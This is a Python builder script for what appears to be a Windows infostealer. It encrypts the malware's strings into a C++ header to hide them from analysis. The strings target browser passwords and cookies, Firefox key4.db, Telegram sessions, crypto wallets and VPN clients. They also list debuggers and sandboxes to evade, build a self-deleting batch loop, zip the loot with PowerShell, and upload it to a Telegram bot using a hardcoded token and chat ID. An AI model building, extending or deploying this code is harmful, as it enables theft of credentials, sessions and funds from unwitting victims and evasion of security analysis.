#!/usr/bin/env python3
# generate_obfuscated.py – generates generated_obfuscation.h with all strings (extended to 150)
# Usage:
#   python generate_obfuscated.py                          ← uses defaults below
#   python generate_obfuscated.py --token T --chat-id C   ← builder GUI mode
import os
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# ============================================================
# القيم الافتراضية (تُستخدم عند التشغيل اليدوي بدون args)
# ============================================================
_DEFAULT_TOKEN   = "8990376736:AAFZjvT-dXKxvNHBfpXj9c5p5fCFRPfUnUo"
_DEFAULT_CHAT_ID = "5432112961"

# ── دعم CLI arguments (يُستخدم من builder_gui.py) ───────────────────────────
_parser = argparse.ArgumentParser(description="Generate obfuscated string header")
_parser.add_argument("--token",   default=None, help="Telegram bot token")
_parser.add_argument("--chat-id", default=None, dest="chat_id",
                     help="Telegram chat/user ID")
_args = _parser.parse_args()

BOT_TOKEN = _args.token   if _args.token   else _DEFAULT_TOKEN
CHAT_ID   = _args.chat_id if _args.chat_id else _DEFAULT_CHAT_ID
# ============================================================

# قائمة السلاسل النصية الكاملة (حتى المعرف 150)
strings = {
    # السلاسل القديمة (1-72)
    1: "tdata",
    2: "Telegram Desktop",
    3: "api.telegram.org",
    4: "/bot",
    5: "/sendDocument",
    6: "Chrome",
    7: "Edge",
    8: "Brave",
    9: "Opera",
    10: "Vivaldi",
    11: "Safari",
    12: "Tor Browser",
    13: "Chromium",
    14: "Epic",
    15: "Opera GX",
    16: "Google\\Chrome\\User Data",
    17: "Microsoft\\Edge\\User Data",
    18: "BraveSoftware\\Brave-Browser\\User Data",
    19: "Opera Software\\Opera Stable",
    20: "Vivaldi\\User Data",
    21: "Apple Computer\\Safari",
    22: "Tor Browser\\Browser\\TorBrowser\\Data\\Browser",
    23: "Chromium\\User Data",
    24: "Epic Privacy Browser\\User Data",
    25: "Opera GX\\User Data",
    26: "Local State",
    27: "Login Data",
    28: "Cookies",
    29: "Web Data",
    30: "Mozilla\\Firefox\\Profiles",
    31: "key4.db",
    32: "logins.json",
    33: "cookies.sqlite",
    34: "Cannot open file: ",
    35: "Cannot read file: ",
    36: "Attempt ",
    37: " failed. Response: ",
    38: "Send SUCCESS",
    39: "Send FAILED",
    40: "powershell -Command \"Compress-Archive -Path '",
    41: "vmtoolsd.exe",
    42: "procmon.exe",
    43: "procexp.exe",
    44: "wireshark.exe",
    45: "x64dbg.exe",
    46: "ollydbg.exe",
    47: "ida.exe",
    48: "windbg.exe",
    49: "vboxservice.exe",
    50: "sandbox",
    51: "malware",
    52: "analysis",
    53: "virus",
    54: "test",
    55: "user",
    56: "virtual",
    57: "key_datas",
    58: "map",
    59: "@echo off",
    60: ":loop",
    61: "del \"",
    62: "\" /f /q",
    63: "if exist \"",
    64: "\" goto loop",
    65: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    66: "----",
    67: "Content-Disposition: form-data; name=\"chat_id\"",
    68: "Content-Disposition: form-data; name=\"document\"; filename=\"data.zip\"",
    69: "application/zip",
    70: "\\*' -DestinationPath '",
    71: BOT_TOKEN,
    72: CHAT_ID,
    
    # السلاسل الجديدة (73-150)
    73: "https://api.ipify.org",
    74: "https://icanhazip.com",
    75: "SYSTEM INFORMATION",
    76: "IP Address",
    77: "Computer Name",
    78: "User Name",
    79: "OS Version",
    80: "Architecture",
    81: "RAM",
    82: "CPU",
    83: "GPU",
    84: "Language",
    85: "Time Zone",
    86: "Installed Software",
    87: "Discord",
    88: "Viber",
    89: "TLauncher",
    90: "Steam",
    91: "Bluestacks",
    92: "Wallets",
    93: "Exodus",
    94: "Atomic",
    95: "Electrum",
    96: "Guarda",
    97: "Coinomi",
    98: "MetaMask",
    99: "Coinbase Wallet",
    100: "Binance Wallet",
    101: "Phantom",
    102: "Ronin",
    103: "TronLink",
    104: "Trust Wallet",
    105: "OpenVPN",
    106: "NordVPN",
    107: "ProtonVPN",
    108: "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
    109: "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
    110: "Program Files",
    111: "Program Files (x86)",
    112: "AppData",
    113: "Local AppData",
    114: "report.html",
    115: "system_info.txt",
    116: "Passwords",
    117: "Cookies",
    118: "History",
    119: "Bookmarks",
    120: "AutoFills",
    121: "Wallets",
    122: "Sessions",
    123: "detected_apps.txt",
    124: "PC USER INFORMATION",
    125: "BASIC INFORMATION",
    126: "GRABBED SOFTWARE",
    127: "DOMAINS DETECTED",
    128: "Passwords - ",
    129: "Cookies - ",
    130: "History - ",
    131: "AutoFills - ",
    132: "CC - ",
    133: "Grabbed Files - ",
    134: "github.com",
    135: "passwords.txt",
    136: "cookies_export.txt",
    137: "history.csv",
    138: "bookmarks.json",
    139: "autofills.csv",
    # يمكن إضافة المزيد حتى 150 إذا أردت، لكن نكتفي بـ 139
}

# توليد مفتاح عشوائي (256-bit) و IV (128-bit)
key = os.urandom(32)
iv = os.urandom(16)

def encrypt_string(s):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    padded = pad(s.encode('utf-8'), AES.block_size)
    return cipher.encrypt(padded)

with open("generated_obfuscation.h", "w", encoding="utf-8") as f:
    f.write("// generated_obfuscation.h - auto generated\n")
    f.write("// DO NOT EDIT - will be replaced on each build\n\n")
    f.write("#pragma once\n")
    f.write("#include <cstddef>\n\n")
    
    f.write(f"static const unsigned char OBF_KEY[{len(key)}] = {{")
    f.write(', '.join(f"0x{b:02x}" for b in key))
    f.write("};\n\n")
    
    f.write(f"static const unsigned char OBF_IV[{len(iv)}] = {{")
    f.write(', '.join(f"0x{b:02x}" for b in iv))
    f.write("};\n\n")
    
    for sid, s in strings.items():
        enc = encrypt_string(s)
        f.write(f"static const unsigned char OBF_STR_{sid}[{len(enc)}] = {{")
        f.write(', '.join(f"0x{b:02x}" for b in enc))
        f.write("};\n")
        f.write(f"static const size_t OBF_STR_{sid}_LEN = {len(enc)};\n\n")
    
    f.write("// end of file\n")

print(f"[+] Successfully generated generated_obfuscation.h")
print(f"[+] Total encrypted strings: {len(strings)}")